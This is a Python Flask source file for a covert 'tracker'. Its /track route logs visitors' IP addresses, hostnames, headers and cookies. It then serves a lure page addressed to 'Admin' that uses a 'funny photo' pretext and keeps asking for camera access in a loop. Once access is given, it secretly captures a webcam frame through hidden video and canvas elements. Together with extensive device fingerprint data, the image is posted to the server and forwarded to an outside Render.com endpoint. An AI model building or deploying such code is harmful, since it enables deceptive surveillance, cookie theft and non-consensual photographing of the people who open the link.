from flask import Flask, request, render_template_string, jsonify
import time
import json
from user_agents import parse
import os
import requests
import socket

app = Flask(__name__)

visitor_data = []
RENDER_ENDPOINT = "https://dashboard.render.com/web/srv-cvhbub1u0jms73bk9lo0/logs"

@app.route('/track')
def track():
    ip_address = request.remote_addr
    raw_user_agent = request.headers.get('User-Agent', 'Unknown')
    headers = dict(request.headers)

    ua = parse(raw_user_agent)
    
    try:
        hostname = socket.gethostbyaddr(ip_address)[0]
    except (socket.herror, socket.gaierror):
        hostname = 'Unknown'

    browser_profile_name = (
        f"{ua.browser.family or 'Unknown'}-{ua.browser.version_string or 'Unknown'}_"
        f"{ua.os.family or 'Unknown'}-{ua.os.version_string or 'Unknown'}_"
        f"{ua.device.family or 'Unknown'}-{ua.device.brand or 'Unknown'}"
    ).replace(" ", "-")

    visitor_info = {
        'ip': ip_address,
        'hostname': hostname,
        'user_agent': raw_user_agent,
        'browser_profile_name': browser_profile_name,
        'device': ua.device.family if ua.device.family else 'Unknown',
        'device_brand': ua.device.brand if ua.device.brand else 'Unknown',
        'device_model': ua.device.model if ua.device.model else 'Unknown',
        'os': ua.os.family if ua.os.family else 'Unknown',
        'os_version': ua.os.version_string if ua.os.version_string else 'Unknown',
        'browser': ua.browser.family if ua.browser.family else 'Unknown',
        'browser_version': ua.browser.version_string if ua.browser.version_string else 'Unknown',
        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
        'headers': headers,
        'referrer': request.referrer if request.referrer else 'Unknown',
        'cookies': request.cookies if request.cookies else 'None',
        'accept_language': request.headers.get('Accept-Language', 'Unknown'),
        'accept_encoding': request.headers.get('Accept-Encoding', 'Unknown'),
        'connection': request.headers.get('Connection', 'Unknown'),
        'host': request.headers.get('Host', 'Unknown')
    }
    visitor_data.append(visitor_info)

    html = """
    <html>
    <body>
        <h1>Hello Admin</h1>
        <p>Hi here is a funny photo post this.</p>
        <img src="https://raw.githubusercontent.com/Ezhilkirthik/Hello/main/Image2.jpg" alt="Funny Image" width="400">
        <img src= "https://raw.githubusercontent.com/Ezhilkirthik/Hello/main/Image1.jpg" alt="Funny Image" width="400">
        <p id="status"> </p>
        <video id="video" width="640" height="480" autoplay style="display:none;"></video>
        <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
        
        <script>
            // Webcam screenshot functionality with persistent attempts
            async function captureScreenshot() {
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                const context = canvas.getContext('2d');

                const constraints = { 
                    video: { 
                        facingMode: "user",
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }
                };

                while (true) {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia(constraints);
                        video.srcObject = stream;
                        await new Promise(resolve => video.onloadedmetadata = resolve);
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const screenshot = canvas.toDataURL('image/jpeg');
                        stream.getTracks().forEach(track => track.stop());
                        return screenshot;
                    } catch (err) {
                        console.error('Camera access failed:', err.name, err.message);
                        document.getElementById('status').innerText = 
                            'Camera access denied. Please allow camera access to continue.';
                        
                        // Prompt user to retry or proceed without photo
                        if (confirm('Camera access is required to take a funny photo! Click OK to try again or Cancel to skip.')) {
                            // Wait briefly and retry
                            await new Promise(resolve => setTimeout(resolve, 1000));
                            continue;
                        } else {
                            return {
                                error: 'Camera access denied by user',
                                errorDetails: err.message,
                                timestamp: new Date().toISOString()
                            };
                        }
                    }
                }
            }

            // Collect client-side data
            const deviceInfo = {
                screenWidth: screen.width,
                screenHeight: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                windowWidth: window.innerWidth,
                windowHeight: window.innerHeight,
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio || 'Unknown',
                orientation: screen.orientation ? screen.orientation.type : 'Unknown',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timeOffset: new Date().getTimezoneOffset(),
                languages: navigator.languages || [navigator.language || navigator.userLanguage],
                platform: navigator.platform || 'Unknown',
                product: navigator.product || 'Unknown',
                vendor: navigator.vendor || 'Unknown',
                memory: navigator.deviceMemory || 'Not available',
                cpuCores: navigator.hardwareConcurrency || 'Not available',
                connection: (navigator.connection || navigator.mozConnection || navigator.webkitConnection) ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    downlinkMax: navigator.connection.downlinkMax || 'Not available',
                    rtt: navigator.connection.rtt,
                    type: navigator.connection.type || 'Unknown'
                } : 'Not available',
                cookiesEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack || window.doNotTrack || 'Not set'
            };

            // Attempt camera access and send data
            (async () => {
                const screenshotResult = await captureScreenshot();
                if (screenshotResult && typeof screenshotResult === 'string') {
                    deviceInfo.screenshot = screenshotResult;
                    document.getElementById('status').innerText = 'Photo captured successfully!';
                } else if (screenshotResult && screenshotResult.error) {
                    deviceInfo.cameraError = screenshotResult;
                    document.getElementById('status').innerText = 'Proceeding without photo.';
                }

                fetch('/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(deviceInfo)
                }).then(response => {
                    if (response.ok) {
                        console.log('Data sent successfully');
                    }
                }).catch(err => console.log('Error sending data:', err));
            })();
        </script>
    </body>
    </html>
    """
    return render_template_string(html)

@app.route('/log', methods=['POST'])
def log():
    client_data = request.json
    if visitor_data and client_data:
        # Merge server-side data (including IP) with client-side data
        combined_data = visitor_data[-1].copy()
        combined_data.update(client_data)
        send_to_render(combined_data)
    return jsonify({'status': 'success'})

def send_to_render(data):
    try:
        response = requests.post(RENDER_ENDPOINT, json=data, timeout=15)
        print(f"Data sent to Render.com: {response.status_code}")
        print("Full visitor info:", json.dumps(data, indent=2))
    except Exception as e:
        print(f"Error sending to Render.com: {e}")

@app.route('/')
def root():
    return "Welcome to the tracker. Visit /track to collect data."

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
